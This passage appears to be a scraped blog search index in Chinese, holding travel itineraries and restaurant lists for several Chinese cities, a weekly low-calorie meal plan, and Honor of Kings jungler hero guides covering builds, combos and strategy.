故宫\t0km 景山/北海\t1km 什刹海\t2km 天坛\t3km 南锣鼓巷\t3km 王府井\t1km 牛街\t4km 国子监/孔庙\t4km 颐和园\t20km 798艺术区\t15km 鸟巢水立方\t10km\n🎒 提示： 🕰️ 避开节假日和早晚高峰（建议9点后出发）。 📱 提前预约故宫、颐和园门票（微信小程序“畅游公园”）。\n住宿建议：建议住在“前门/王府井”或“南锣鼓巷”附近，交通便利。\n美食 北京美食餐厅列表 餐厅名称 地址 人均消费 推荐菜品/备注 东直门小院烧烤(回龙观东大街店) 回龙观东大街5号楼1层102 100元左右 牛肉串 很久以前 连锁店（就近搜索） 120元左右 基本都好吃、疙瘩汤很大份 望京眼镜小腰 - - - 福禄娃火锅 西北旺分店 - 火锅首选，小料全、西瓜好吃 牛排家 - - - 拿渡麻辣香锅 - - - 望京越鲜 - - - 虎兵卫烤鳗 - - - 彭姐麻辣烫 五道口 - 鸭皮、鸭脖、猪肺 鑫隆四季涮肉（望京店） 望京 50元 - 新沙洞烤肉 亦庄 80元左右 烤肉 鹤一烤肉 - 160元 - Latina 三元桥/王府井 150-500元 - 川军本色 人民大学 120元 菜品整体优秀 螺蛳粉先生 蓟门桥小区 40元 - 吉二姐铁锅炖 健德门 100元 - 潮汕牛肉火锅 - - - 麦当劳双层吉士汉堡 - 139元 10个1+1套餐 淮扬府 安定门 200元左右 扬州炒饭、生煎包 魏斯理汉堡 北京大兴机场/西安店 50元 各种牛肉汉堡 超意兴把子肉 北京多店（地图搜索） 25元 把子肉 四十大道清河店 - 100元 新疆菜（正宗） 满记烧饼 牛街 5元/个 牛肉烧饼、炸鸡腿 费大厨辣椒炒肉 连锁店 80元 辣椒炒肉 胡大三店 簋街 200元 蒜香小龙虾 雅居小馆车公庄店 车公庄西路与紫竹院南路交叉口 200元 花雕鸡、毛血旺 西部雅古拜牛肉拉面(樊羊路店) 樊羊路69号院2号楼1 100元 烤串、大腰 潇湘阁 连锁店 80元左右 小炒黄牛肉、鸡胗 烤生请就位 定福庄路定福庄北里一号院底商 价格未知 烧烤 林记饸饹面馆 丰台火车站附近 25元 饸饹面 二三九品手工水饺自助 连锁店 50元 饺子自助 喜家喜客自助小火锅 丰台科技园附近 60元 自助小火锅 长沙 d2 📅 第一天：山水历史 + 网红美食 上午：岳麓山 + 岳麓书院（人文自然融合） 地址：岳麓区麓山南路\n推荐路线：\n坐索道上山，步行下山（轻松省力）\n岳麓书院 → 爱晚亭 → 云麓宫 → 山顶观景台\n岳麓书院：中国四大书院之一，湘楚文化发源地\n游览时间：约2-3小时\n中午：大学城美食（地道实惠） 推荐：潇湘晨报食堂、牛肉粉、剁椒鱼头小馆子、炒粉炒饭\n下午：橘子洲头（毛泽东青年雕像地标） 乘坐方式：地铁2号线“橘子洲”站下，步行进入景区\n游览方式：\n电瓶车环岛游（约30-40分钟）\n徒步看湘江两岸风光，打卡毛主席青年雕像\n游览时间：1.5小时左右\n小贴士：每周六晚上有烟花表演（具体时间提前查看公众号）\n晚上：太平街 + 坡子街夜市（长沙美食地标） 推荐美食：\n火宫殿臭豆腐（老字号）\n茶颜悦色奶茶（本地标志）\n串串香、糖油粑粑、大香肠、牛油锅巴、龙脂猪油拌粉\n建议路线：坡子街 → 太平老街 → 贾谊故居打卡\n📅 第二天：文艺打卡 + 潮流街区 上午：湖南省博物馆 + 马王堆汉墓（中国古墓代表） 预约方式：微信或官网提前免费预约门票\n看点：\n辣妈辛追夫人真身\n汉代帛画、T形帛画、漆器、丝织品保存完好\n游览时间：2小时左右\n小贴士：馆内冷气强，注意带件薄外套\n中午：博物馆附近觅食 推荐：小炒黄牛肉、剁椒鱼头、湘味热卤、黄鸭叫、香辣牛杂\n下午：IFS国金中心 + 网红打卡点 IFS屋顶大熊猫雕塑（必拍）\n国金中心购物中心：潮牌、美妆、长沙网红书店等\n周边还有：\n超级文和友（复古街市体验+美食）\n文艺青旅、咖啡馆适合休息拍照\n晚上：湘江边漫步，夜景超美\n🛏️ 住宿推荐 建议住在：\n五一广场/黄兴路商圈：交通便利、吃喝玩乐集中\nIFS附近：年轻人喜欢，拍照方便\n岳麓山附近：适合喜欢安静、文艺路线\n💡 旅行Tips 交通：地铁+打车组合最方便，滴滴便宜，长沙地铁覆盖主要景点。\n气候：长沙夏天炎热湿润，春秋最舒适；注意防晒防潮。\n茶颜悦色：排队店多，但市区分店密集，不用特地排爆火店。\n美食提醒：长沙菜偏辣，不能吃辣可以提前说明“微辣”或“不辣”。\n成都 d3 📅 第一天：老成都文化 \u0026amp; 市区打卡地标 行程安排： 上午：宽窄巷子 → 文殊院 宽窄巷子\n感受老成都胡同文化。\n可看川剧变脸、喝盖碗茶、逛创意小店。\n文殊院\n市中心最有名的佛教寺庙之一。\n可在文殊院素斋馆尝试素斋。\n午餐： 陈麻婆豆腐总店（青羊宫附近）\n或文殊坊素斋\n下午：人民公园 → 春熙路 人民公园\n体验成都人的“慢生活”：喝茶、打麻将、掏耳朵。\n推荐去“鹤鸣茶社”喝茶。\n春熙路 / 太古里商圈\n成都最繁华的商圈，适合购物、拍照、体验潮流。\n晚餐： 龙抄手总店（春熙路附近）：小吃集合地。\n小龙坎火锅、蜀大侠火锅：正宗川味火锅。\n📅 第二天：自然动物 \u0026amp; 网红景点 行程安排： 上午：成都大熊猫繁育研究基地 早上是大熊猫最活跃的时候（建议8:00出发）。\n可看到憨态可掬的大熊猫、幼崽、红熊猫等。\n午餐： 附近有川菜馆如“钵钵鸡”、干锅系列等。\n下午：东郊记忆 → U37创意园 东郊记忆\n工业遗址改造的文艺园区，适合拍照。\nU37创意园\n小众文艺地标，适合打卡和休息。\n晚餐： 串串香：如“签签牛”、“马路边边”、“钢管厂五区”。\n📅 第三天：都江堰 or 青城山一日游（自然文化） 适合喜欢自然与历史的游客，也可选其一：\n✅ 方案一：都江堰 + 南桥古镇 🚉 推荐坐高铁从成都东站到都江堰站（约30分钟）。\n都江堰水利工程\n世界文化遗产，感受古代智慧。\n南桥古镇\n有古色古香的桥梁和古街，可品尝当地小吃。\n✅ 方案二：青城山（道教名山） 青城前山\n宫观密布、林木葱郁，是道教发源地之一。\n可搭配索道节省体力，适合休闲+轻徒步。\n如果体力允许，也可选后山（更原生态）。\n晚餐（回到市区后）： 推荐去玉林路、九眼桥美食街，体验成都夜生活。\n🍲 成都特色美食推荐（建议随时尝试）： 冒菜、豆花、兔头、肥肠粉、甜水面、钵钵鸡、蛋烘糕\n本地连锁小吃店推荐：廖记棒棒鸡、张老二凉粉、钟水饺\n🛏 住宿建议： 建议住在春熙路/太古里/宽窄巷子/锦里附近，方便出行+吃喝玩乐。\n若更安静休闲，可选高新区/天府新区。\n🚇 出行建议： 成都地铁非常方便，推荐使用“天府通”APP扫码乘车。\n打车也方便（滴滴/高德），但高峰期可能拥堵。\n西安 d2 📅 第一天：古都探秘之旅 上午：秦始皇兵马俑（世界第八大奇迹） 地址：临潼区秦陵北路\n交通：西安市区出发，乘坐旅游专线巴士5/306路，约1小时。\n游览时间：2-3小时\n看点：\n一号坑（兵马俑主坑，阵容最庞大）\n二号坑（将军车马俑）\n三号坑（指挥部，神秘感强）\n小贴士：建议请导游或租用讲解器，不然容易走马观花。\n中午：临潼当地特色午餐 推荐菜：临潼羊肉泡馍、石子馍夹肉\n餐厅建议：景区门口有几家干净整洁的小馆子，价格亲民。\n下午：华清宫 + 骊山（历史+自然结合） 华清池：唐玄宗与杨贵妃的爱情故事发源地\n骊山索道：可俯瞰临潼全景，步行下山约40分钟\n西安事变旧址也在景区内，可一并参观。\n晚上：回到西安市区，逛【回民街】夜市 推荐美食：\n牛羊肉泡馍\n肉夹馍（老米家推荐）\n凉皮、灌汤包、八宝稀饭\n注意事项：\n注意防骗、卫生\n建议避开游客集中的入口区域，走进巷子口的小店口味更地道\n📅 第二天：城墙文化 + 市区休闲 上午：西安古城墙（南门上城） 推荐方式：租自行车骑行一圈（约14公里，1.5小时）\n特色：明代城墙，保存完整，骑行体验感极佳，适合拍照打卡。\n开放时间：08:00-20:00（旺季延长）\n中午：永宁门/钟楼附近美食街 推荐餐厅：德发长（饺子宴）、魏家凉皮、春发生\n下午：大雁塔 \u0026amp; 大唐不夜城 大雁塔：玄奘法师取经归来后主持翻译佛经的地方（建议外观拍照，不一定要登塔）\n大慈恩寺也在旁边，可顺路游览\n大唐不夜城：\n免费开放\n晚上灯光秀、人偶表演、网红打卡景点众多\n小朋友也很喜欢，适合亲子游\n晚上：可选择 泡温泉：曲江池/骊山脚下有高端温泉可体验\n乘坐西安夜游观光巴士：从永宁门出发，夜游城墙、大雁塔、大唐不夜城等。\n💡 旅行小贴士 交通建议：地铁+滴滴出行，西安打车不贵，景点相对集中。\n门票建议：建议提前线上购买兵马俑、华清宫等热门景点门票。\n穿着建议：西安昼夜温差大，春秋注意保暖；夏季注意防晒。\n住宿推荐：建议住在【钟楼】或【南门】附近，方便出行，步行可达多个景点。\n","permalink":"https://qfsyso.github.io/posts/zhangzhou-planb/","summary":"惠州 d1 惠州一日游推荐路线（经典版） d1 关键词：自然风景 + 历史文化 + 城市慢游\n早上7:00-8:00出发 高铁到达后可打车或使用共享电单车前往景区。\n行程安排： 上午：惠州西湖 + 苏东坡纪念馆 📍【惠州西湖】是国家5A级景区，素有“小西湖”之称。\n必看景点：苏堤、平湖秋月、泗洲塔、孤山\n建议可租船游湖（手划船或电动船）\n🏛【苏东坡纪念馆】：了解东坡在惠州的贬谪岁月，免费参观\n🕒 游玩时间：2-2.5小时\n中午：西湖周边午餐 推荐本地小吃：\n梅菜扣肉、东江盐焗鸡、客家酿豆腐、炒米粉\n推荐店铺：阿婆小吃馆、西湖人家、惠州食街\n下午：红花湖骑行 or 逛古街 你可根据兴趣选择以下之一：\n✅ 方案 A：红花湖生态骑行 📍红花湖风景区，环湖绿道约19公里，沿途山林清幽、湖水清澈\n可租自行车/电动车慢骑一圈\n拍照打卡 + 吹风放空都超舒服！\n✅ 方案 B：下埔古村 or 丰渚园闲逛 📍下埔古村：岭南老巷古宅，文艺风浓厚，适合拍照 + 喝咖啡\n📍丰渚园：岭南园林风格+苏式园林结合，门票便宜，人少景美\n傍晚：东江边散步 + 晚餐 可选择回到【东江公园】或【水东街】沿江走走\n看落日 + 东江夜景，特别适合情侣/亲子慢游\n晚餐推荐东江鱼、烧鹅饭、潮汕牛肉火锅\n🏨 返回建议： 可选择高铁 19:00 – 21:00 之间返程\n或者住一晚民宿，第二天去双月湾/巽寮湾（适合两日游延伸）\n💡小贴士 项目\t建议 出行工具\t高铁 + 滴滴/共享单车为主，方便灵活 衣着\t轻便鞋子（西湖、红花湖走路较多） 拍照点\t泗洲塔远景、西湖桥影、红花湖湖面","title":"ZhangZhou PlanB"},{"content":" 时间 餐次 食物 参数 热量（大卡） 替换建议 周一 早餐 全麦面包 + 水煮蛋 + 无糖豆浆 + 拌黄瓜 面包40g，鸡蛋50g，豆浆200ml，黄瓜100g，橄榄油5g 约300 面包可换燕麦粥（30g燕麦+150ml牛奶），黄瓜换圣女果100g 周一 午餐 杂粮饭 + 香煎鸡胸肉 + 清炒西兰花 杂粮饭80g（生重），鸡胸肉150g，西兰花200g，橄榄油8g 约500 杂粮饭换糙米饭，鸡胸肉换鲈鱼/瘦牛肉，西兰花换菠菜/油麦菜 周一 晚餐 蒸红薯 + 白灼虾 + 凉拌菠菜 红薯100g，虾80g，菠菜150g，芝麻油3g 约350 红薯换玉米半根，虾换豆腐100g，菠菜换莴笋/绿豆芽 周二 早餐 燕麦粥 + 水煮蛋 + 圣女果 燕麦30g，牛奶150ml，鸡蛋50g，圣女果100g 约280 燕麦换全麦面包2片，圣女果换黄瓜100g 周二 午餐 糙米饭 + 清蒸鲈鱼 + 清炒油麦菜 糙米饭100g（生重），鲈鱼150g，油麦菜200g，橄榄油5g 约520 鲈鱼换巴沙鱼/鸡胸肉，油麦菜换空心菜/西兰花 周二 晚餐 荞麦面 + 卤鸡腿（去皮） + 番茄冬瓜汤 荞麦面50g（干重），鸡腿100g，番茄50g，冬瓜100g，橄榄油3g 约350 荞麦面换魔芋面，鸡腿换虾仁/瘦牛肉，冬瓜汤换紫菜蛋花汤 周三 早餐 全麦三明治 + 无糖酸奶 面包40g，生菜50g，火腿50g，番茄30g，酸奶100g 约320 三明治换包子（全麦素馅80g），酸奶换豆浆200ml 周三 午餐 小米饭 + 瘦牛肉炒青椒 + 凉拌莴笋 小米饭100g（生重），牛肉120g，青椒150g，莴笋150g，橄榄油8g 约550 小米饭换藜麦饭，牛肉换鸡胸肉，青椒换胡萝卜/芹菜 周三 晚餐 蒸土豆 + 豆腐炖白菜 + 清炒绿豆芽 土豆150g，豆腐100g，白菜200g，绿豆芽100g，橄榄油6g 约330 土豆换南瓜，豆腐换鸡蛋1个（蒸蛋），绿豆芽换娃娃菜 周四 早餐 玉米 + 水煮蛋 + 黑咖啡 + 水煮西兰花 玉米100g，鸡蛋50g，西兰花50g 约250 玉米换燕麦粥（30g燕麦），西兰花换黄瓜100g 周四 午餐 意大利面 + 烤鸡胸肉 + 番茄菠菜沙拉 意面80g（干重），鸡胸肉120g，番茄100g，菠菜100g，橄榄油5g 约530 意面换荞麦面，鸡胸肉换鳕鱼，沙拉换清炒菠菜 周四 晚餐 蒸南瓜 + 清炖鲫鱼 + 清炒空心菜 南瓜150g，鲫鱼150g，空心菜200g，橄榄油3g 约380 南瓜换山药，鲫鱼换虾仁/豆腐，空心菜换油菜 周五 早餐 全麦素馅包子 + 茶叶蛋 + 凉拌海带丝 包子80g，鸡蛋50g，海带丝50g 约280 包子换燕麦饼（30g燕麦+鸡蛋1个），海带丝换莴笋100g 周五 午餐 杂粮饭（大米 + 藜麦） + 香煎巴沙鱼 + 蒜蓉西兰花 杂粮饭100g（生重），巴沙鱼150g，西兰花200g，橄榄油5g 约510 巴沙鱼换鲈鱼/鸡胸肉，西兰花换芦笋/生菜 周五 晚餐 燕麦饼 + 虾仁蒸蛋 + 清炒娃娃菜 燕麦30g，鸡蛋50g，虾仁50g，娃娃菜150g，橄榄油3g 约320 燕麦饼换全麦面包1片，虾仁换瘦牛肉，娃娃菜换豆芽 周六 早餐 全麦面包 + 牛油果 + 水煮蛋 + 黄瓜 面包20g，牛油果30g，鸡蛋50g，黄瓜100g 约260 牛油果换无糖酸奶100g，黄瓜换小番茄100g 周六 午餐 糙米饭 + 红烧瘦肉 + 清炒胡萝卜丝 糙米饭80g（生重），瘦猪肉100g，胡萝卜150g，橄榄油3g 约480 瘦肉换鸡胸肉（烤/蒸），胡萝卜换青椒/芹菜 周六 晚餐 魔芋丝结 + 卤牛肉 + 菠菜蛋花汤 魔芋丝100g，牛肉100g，菠菜50g，鸡蛋50g，橄榄油2g 约310 魔芋丝换荞麦面50g，牛肉换虾仁，蛋花汤换冬瓜汤 周日 早餐 小米粥 + 酱牛肉 + 拌莴笋 小米30g，牛肉50g，莴笋100g，橄榄油2g 约220 小米粥换玉米半根，牛肉换水煮蛋1个，莴笋换海带丝 周日 午餐 荞麦面 + 烤鸡胸肉 + 凉拌木耳 荞麦面70g（干重），鸡胸肉120g，木耳100g，橄榄油3g 约490 荞麦面换意大利面，鸡胸肉换瘦牛肉，木耳换黄瓜沙拉 周日 晚餐 蒸山药 + 清蒸虾 + 清炒油菜 山药150g，虾80g，油菜200g，橄榄油5g 约350 山药换红薯，虾换巴沙鱼，油菜换西兰花 使用说明 热量控制：每日总热量约 1500-1700 大卡，可根据体重变化调整主食或蛋白质重量（如体重下降过慢，可减少主食 10-20g / 餐）。 灵活替换：同类别食材（如主食、蛋白质、蔬菜）可按 “替换建议” 自由搭配，避免单调。 烹饪提示：食用油总量建议≤10g / 天，尽量使用橄榄油或菜籽油，避免油炸、糖醋做法。 加餐选项：可在上午 10 点 / 下午 3 点加食低脂酸奶 100g 或 10g 坚果（单独记录热量）。 ","permalink":"https://qfsyso.github.io/posts/eat-plan/","summary":" 时间 餐次 食物 参数 热量（大卡） 替换建议 周一 早餐 全麦面包 + 水煮蛋 + 无糖豆浆 + 拌黄瓜 面包40g，鸡蛋50g，豆浆200ml，黄瓜100g，橄榄油5g 约300 面包可换燕麦粥（30g燕麦+150ml牛奶），黄瓜换圣女果100g 周一 午餐 杂粮饭 + 香煎鸡胸肉 + 清炒西兰花 杂粮饭80g（生重），鸡胸肉150g，西兰花200g，橄榄油8g 约500 杂粮饭换糙米饭，鸡胸肉换鲈鱼/瘦牛肉，西兰花换菠菜/油麦菜 周一 晚餐 蒸红薯 + 白灼虾 + 凉拌菠菜 红薯100g，虾80g，菠菜150g，芝麻油3g 约350 红薯换玉米半根，虾换豆腐100g，菠菜换莴笋/绿豆芽 周二 早餐 燕麦粥 + 水煮蛋 + 圣女果 燕麦30g，牛奶150ml，鸡蛋50g，圣女果100g 约280 燕麦换全麦面包2片，圣女果换黄瓜100g 周二 午餐 糙米饭 + 清蒸鲈鱼 + 清炒油麦菜 糙米饭100g（生重），鲈鱼150g，油麦菜200g，橄榄油5g 约520 鲈鱼换巴沙鱼/鸡胸肉，油麦菜换空心菜/西兰花 周二 晚餐 荞麦面 + 卤鸡腿（去皮） + 番茄冬瓜汤 荞麦面50g（干重），鸡腿100g，番茄50g，冬瓜100g，橄榄油3g 约350 荞麦面换魔芋面，鸡腿换虾仁/瘦牛肉，冬瓜汤换紫菜蛋花汤 周三 早餐 全麦三明治 + 无糖酸奶 面包40g，生菜50g，火腿50g，番茄30g，酸奶100g 约320 三明治换包子（全麦素馅80g），酸奶换豆浆200ml 周三 午餐 小米饭 + 瘦牛肉炒青椒 + 凉拌莴笋 小米饭100g（生重），牛肉120g，青椒150g，莴笋150g，橄榄油8g 约550 小米饭换藜麦饭，牛肉换鸡胸肉，青椒换胡萝卜/芹菜 周三 晚餐 蒸土豆 + 豆腐炖白菜 + 清炒绿豆芽 土豆150g，豆腐100g，白菜200g，绿豆芽100g，橄榄油6g 约330 土豆换南瓜，豆腐换鸡蛋1个（蒸蛋），绿豆芽换娃娃菜 周四 早餐 玉米 + 水煮蛋 + 黑咖啡 + 水煮西兰花 玉米100g，鸡蛋50g，西兰花50g 约250 玉米换燕麦粥（30g燕麦），西兰花换黄瓜100g 周四 午餐 意大利面 + 烤鸡胸肉 + 番茄菠菜沙拉 意面80g（干重），鸡胸肉120g，番茄100g，菠菜100g，橄榄油5g 约530 意面换荞麦面，鸡胸肉换鳕鱼，沙拉换清炒菠菜 周四 晚餐 蒸南瓜 + 清炖鲫鱼 + 清炒空心菜 南瓜150g，鲫鱼150g，空心菜200g，橄榄油3g 约380 南瓜换山药，鲫鱼换虾仁/豆腐，空心菜换油菜 周五 早餐 全麦素馅包子 + 茶叶蛋 + 凉拌海带丝 包子80g，鸡蛋50g，海带丝50g 约280 包子换燕麦饼（30g燕麦+鸡蛋1个），海带丝换莴笋100g 周五 午餐 杂粮饭（大米 + 藜麦） + 香煎巴沙鱼 + 蒜蓉西兰花 杂粮饭100g（生重），巴沙鱼150g，西兰花200g，橄榄油5g 约510 巴沙鱼换鲈鱼/鸡胸肉，西兰花换芦笋/生菜 周五 晚餐 燕麦饼 + 虾仁蒸蛋 + 清炒娃娃菜 燕麦30g，鸡蛋50g，虾仁50g，娃娃菜150g，橄榄油3g 约320 燕麦饼换全麦面包1片，虾仁换瘦牛肉，娃娃菜换豆芽 周六 早餐 全麦面包 + 牛油果 + 水煮蛋 + 黄瓜 面包20g，牛油果30g，鸡蛋50g，黄瓜100g 约260 牛油果换无糖酸奶100g，黄瓜换小番茄100g 周六 午餐 糙米饭 + 红烧瘦肉 + 清炒胡萝卜丝 糙米饭80g（生重），瘦猪肉100g，胡萝卜150g，橄榄油3g 约480 瘦肉换鸡胸肉（烤/蒸），胡萝卜换青椒/芹菜 周六 晚餐 魔芋丝结 + 卤牛肉 + 菠菜蛋花汤 魔芋丝100g，牛肉100g，菠菜50g，鸡蛋50g，橄榄油2g 约310 魔芋丝换荞麦面50g，牛肉换虾仁，蛋花汤换冬瓜汤 周日 早餐 小米粥 + 酱牛肉 + 拌莴笋 小米30g，牛肉50g，莴笋100g，橄榄油2g 约220 小米粥换玉米半根，牛肉换水煮蛋1个，莴笋换海带丝 周日 午餐 荞麦面 + 烤鸡胸肉 + 凉拌木耳 荞麦面70g（干重），鸡胸肉120g，木耳100g，橄榄油3g 约490 荞麦面换意大利面，鸡胸肉换瘦牛肉，木耳换黄瓜沙拉 周日 晚餐 蒸山药 + 清蒸虾 + 清炒油菜 山药150g，虾80g，油菜200g，橄榄油5g 约350 山药换红薯，虾换巴沙鱼，油菜换西兰花 使用说明 热量控制：每日总热量约 1500-1700 大卡，可根据体重变化调整主食或蛋白质重量（如体重下降过慢，可减少主食 10-20g / 餐）。 灵活替换：同类别食材（如主食、蛋白质、蔬菜）可按 “替换建议” 自由搭配，避免单调。 烹饪提示：食用油总量建议≤10g / 天，尽量使用橄榄油或菜籽油，避免油炸、糖醋做法。 加餐选项：可在上午 10 点 / 下午 3 点加食低脂酸奶 100g 或 10g 坚果（单独记录热量）。 ","title":"Eat Plan"},{"content":"镜 一、技能机制解析 被动-铸镜\n攻击目标后触发镜像标记，再次攻击可触发额外伤害并刷新技能CD，刷野/连招时需穿插平A触发被动。 一技能-开锋\n突进并强化普攻，主要位移和起手技能，命中减少冷却时间。 二技能-裂空\n范围伤害+回血+减速，开局优先加点用于续航和快速清野。 三技能-见影\n定身敌人并展开镜像场，本体与镜像协同攻击，核心连招与换位收割技能。 二、出装与铭文推荐 出装方案 核心装备：\n红色打野刀 → 抵抗之靴 → 暗影战斧 → 宗师之力 → 破军 → 碎星锤/名刀 高爆发流：破军+碎星锤瞬秒脆皮 生存调整：敌方控制多时换魔女斗篷，物理爆发高换反伤刺甲 铭文搭配 通用暴击流：\n10隐匿（移速/攻击） + 10鹰眼（穿透） + 2红月8异变（穿透+暴击） 极致爆发流：\n10祸源（暴击率） + 10隐匿 + 10鹰眼 三、连招技巧 基础连招：\n1A2A1A（3级前清野/消耗） 突进收割：\n31A21A（大招起手定身，接技能穿插平A） 飞雷神连招：\n31A2A1A3（镜像场内反复换位，持续刷新技能） 四、打野节奏思路 前期（1-4级） 开局红BUFF：\n点二技能快速清野，利用被动刷新CD提升效率 抢河道之灵：\n1分钟时抵达中路，配合惩戒争夺经济。 反野策略：\n针对敌方弱势打野（如李白、阿轲）入侵蓝区，压制发育。 中期（4-10级） 抓人优先级：\n优先抓发育路，利用大招越塔强杀脆皮。 控龙时机：\n击杀敌方打野后立即开暴君/主宰，扩大团队优势。 后期（10级后） 带线牵制：\n利用镜像快速清兵推塔，迫使敌方回防。 绕后切C：\n团战第二时间进场，直切射手/法师，连招秒杀后撤离。 五、团战与细节技巧 进场时机：\n等待敌方交关键控制技能（如张良大招）后再切入。 镜像场运用：\n横放大招可封锁路径，竖放便于换位追击残血。 探草技巧：\n释放二技能命中草丛敌人触发音效，判断埋伏位置。 六、克制与注意事项 克制英雄：\n鲁班七号、妲己等无位移脆皮。 被克英雄：\n东皇太一（压制）、张良（强控）、兰陵王（隐身偷袭）。 关键细节： 蓝BUFF必拿（镜依赖冷却缩减） 逆风局避免正面团战，专注带线偷塔 ​​暃 一、技能机制解析 被动-玉息·星眸\n上墙后获得100点移速加成并探测首个敌人视野（包括隐身单位），核心战略价值在于反制兰陵王、阿轲等隐身英雄。 一技能-逐玉·锋回 地面形态：直线飞刃两段伤害（类似铠1技能） 墙上形态：突进下墙获得3层护盾+2次强化普攻（攻速提升75%），第二段可击飞敌人 二技能-踏玉·飞檐\n核心位移技能，可连续跳跃墙体4次（跳跃次数越多，下墙后CD越长），上墙后刷新一技能并降低CD，战略意义大于输出 三技能-凝玉·之印\n两段斩杀技：第一段标记敌人，第二段对生命值低于**12%**的目标直接斩杀（无视名刀/复活甲），墙上释放时攻击范围扩大至360° 二、出装与铭文推荐（适配5月改版） 出装方案 新版核心出装（攻速流）：\n贪婪之噬 → 急速战靴 → 寒霜袭侵 → 冰痕之握 → 破军 → 纯净苍穹\n改版后更依赖墙上强化普攻消耗，寒霜袭侵提供攻速+减速，冰痕之握增强坦度 极限爆发流（顺风局）：\n追击刀锋 → 抵抗之靴 → 暗影战斧 → 宗师之力 → 破军 → 碎星锤 铭文搭配 通用方案：\n5夺萃+5隐匿（续航+移速） + 10鹰眼（穿透） + 9异变+1红月（破攻速阈值） 暴击流：\n10隐匿 + 10鹰眼 + 3无双+7祸源（后期爆发） 三、连招技巧与实战应用 基础连招 清野/抓人起手：\n2（上墙）→1（下墙）→1（二段击飞）→A→A\n利用强化普攻回血，触发冰痕之握减速留人 远距离追击：\n2（连续跳跃）→1（下墙）→3（标记）→A→A→3（斩杀）\n类似兰陵王2技能接普攻机制 高阶连招 团战收割：\n2（墙体突进）→3（360°标记）→1（群体击飞）→A→A→3（斩杀）\n利用墙上大招范围优势 新版消耗流：\n2（存储四段位移）→多次跳跃→1（远程强化普攻）→撤回墙体\n改版后新增弹射机制，适合poke战术 四、打野节奏与运营思路 前期（1-4级） 开局策略：\n必买打野刀→主升二技能，红BUFF开提升刷野效率（改版后清野速度下降需谨慎） 反野要点：\n针对露娜、韩信等前期弱势打野，利用墙体跳跃实现3秒跨区突袭 中期（4-10级） 控龙优先级：\n击杀敌方打野后立即开暴君，大招斩杀线可秒杀残血主宰 抓人路线：\n优先发育路→对抗路→中轴，墙体突进速度远超常规打野 后期（10级后） 带线牵制：\n利用四段位移实现1人带三线战术，遭遇围剿时可瞬间跨越5堵墙体撤离 团战定位：\n第二时间进场，专切射手/法师，新版玉化机制无视名刀直接斩 五、克制关系与细节技巧 英雄克制 被克英雄：\n东皇太一（压制）、张良（强控）、金蝉（紧箍限制位移） 天克目标：\n鲁班七号、妲己等无位移脆皮，伽罗（破盾机制反制） 操作细节 墙体视野：\n上墙时可探测草丛，但不暴露自身视野（需贴近墙体边缘） 玉化斩杀：\n新版大招新增玉化标记，被标记目标无法通过治疗/护盾抵消斩杀 逃生艺术：\n被追击时采用2→1→2→1循环，实现无限墙体马拉松战术 六、版本强度评估 优势：\n✔️ 全峡谷最强机动性（四段存储位移）\n✔️ 战略级视野控制+无视保命装斩杀\n✔️ 新版弹射机制提升团战AOE能力 弱点：\n❌ 前期清野速度全打野倒数\n❌ 怕硬控集火（新增25%受控负面效果）\n❌ 强化普攻射程削弱50码 虎 裴擒虎 一、双形态技能核心机制 人形态特点\n被动「寸劲」：普攻附带叠加法术伤害（3秒内同一目标最高3倍），每次命中回复5点能量 一技能「冲拳式」：直线减速+目标当前生命值8%的法术伤害，命中英雄回复20能量 二技能「气守式」：护盾+持续灼烧+30%攻速提升，护盾存在期间普攻可延长灼烧时间 切换虎形态：获得两次强化普攻（首次带穿墙位移） 虎形态特点\n被动「念气」：增加物攻/双抗/移速 一技能「虎啸式」：斩杀技，目标每损失1%生命增伤1%，击杀目标返还20能量 二技能「虎跃式」：地形折返跳，命中单位返还50%冷却+回复能量 切换人形态：强化普攻附带扇形AOE伤害 二、出装与铭文配置 版本强势出装 核心装备：\n贪婪之噬 → 抵抗之靴 → 末世 → 宗师之力 → 碎星锤 → 破军 新版思路：末世触发被动高频伤害，宗师强化形态切换爆发 备选调整： 敌方多控：第三件补纯净苍穹免伤 逆风局：冰痕之握+暴烈之甲提升容错 铭文推荐 攻速暴击流：\n10狩猎（移速/攻速） + 10鹰眼（穿透） + 5红月5异变（攻速/穿透） 爆发穿透流：\n10隐匿（攻击/移速） + 10鹰眼 + 10异变（极致穿透） 三、连招体系与实战应用 基础连招 Gank起手式：\n人形态2技能护盾→1技能减速→切换虎形态2A1A\n关键点：护盾持续期间普攻触发灼烧 地形折返跳：\n虎形态2技能触碰墙体→折返跳回→切换人形态强化AOE\n应用场景：龙坑争夺/越塔强杀 高阶连招 团战切C：\n人形态远程消耗→虎形态2穿墙突进→1斩杀→切人形态扇形AOE\n能量管理：确保切换形态后至少保留40能量 无伤磨塔：\n人形态2技能护盾→强化普攻→立即撤出塔范围\n单次可对防御塔造成1200+伤害 四、打野节奏与运营思路 前期（1-4级） 开局策略：\n红BUFF开局：利用人形态2技能护盾无伤速刷 1分钟必争：中路河道之灵争夺（虎形态折返跳抢怪） 反野优先级：\n针对露娜/阿轲等弱势打野，2级可越墙突袭蓝区 中期（4-10级） 控龙节奏：\n暴君＞主宰：虎形态斩杀线可秒杀12%血量暴君 偷龙技巧：人形态远程消耗+虎形态折返跳出龙坑 推塔策略：\n优先推发育路，利用人形态强化普攻远程磨塔 后期（10级后） 带线牵制： 四段位移实现「三线分推」，遭遇围剿可穿5墙撤离 关键提示：带线时保持人形态，遭遇战秒切虎形态反打 五、团战细节与克制关系 进场时机：\n第二时间切入，专盯交完闪现的射手/法师 地形利用：野区团战强度提升30%（折返跳空间大） 能量管理：\n人形态多用1技能回能量，虎形态确保2技能命中回能 克制关系：\n天敌：东皇太一（压制）、金蝉（限制位移） 猎物：鲁班七号、妲己等无位移脆皮 六、版本强度评估（2025年5月） 优势：\n✔️ 前中期野区统治力TOP3\n✔️ 双形态适应全期作战节奏\n✔️ 混伤机制克制单抗性阵容 弱点：\n❌ 后期团战容错率低\n❌ 能量断档期易被反杀 信\n韩信 一、技能机制与核心玩法 1. 技能解析 被动「杀意之枪」\n每四次普攻触发击飞0.5秒，技能命中目标增加50%攻速。空A三次存被动，突进后强化普攻可瞬间打出击飞+高额伤害。 一技能「无情冲锋」\n两段位移（第一段击飞），CD短，核心突进/逃生技能。反野时穿墙抢BUFF，团战绕后切C位。 二技能「背水一战」\n后跳+强化普攻横扫，命中返还50%冷却。反向释放调整位置，配合一技能实现“折返跳”拉扯。 三技能「国士无双」\n霸体+免伤30%，持续横扫造成多段伤害。注意释放期间可被硬控打断，需预判敌方技能。 2. 核心打法 定位：高机动刺客，主打带线牵制与后排收割。 